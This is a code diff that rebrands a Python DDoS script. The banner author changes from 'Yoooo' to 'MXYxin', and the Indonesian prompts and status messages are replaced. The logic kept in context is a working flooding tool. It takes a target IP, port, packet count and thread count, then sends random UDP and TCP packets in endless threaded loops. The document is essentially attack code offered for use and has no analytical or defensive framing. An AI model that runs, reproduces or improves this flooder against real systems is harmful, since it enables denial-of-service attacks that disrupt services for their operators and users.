@@ -7,29 +7,29 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
-print("Bismilah Tembus")
+print("Tools DdOs by MXYxin")
+print("yu bisa yu tembus")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
-choice = str(input(" Gas?(y/n): "))
+choice = str(input(" HAYYUK?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
   data = random._urandom(1024)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[M]","[X]","[Y]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" | Send!!!|")
+      print(i +" Assalamualaikum ada paket dari MXYxin")
     except:
-      print("[!] | Send!!! |")
+      print("[!] Terimakasih telah menerima paket dari MXYxin")
 
 def run2():
   data = random._urandom(16)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[M]","[X]","[Y]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,7 +37,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Yoooooooo Di Sini!!!")
+      print(i +" MXYxin Didie!?!?!?!?!")
     except:
       s.close()
       print("[*] Down")
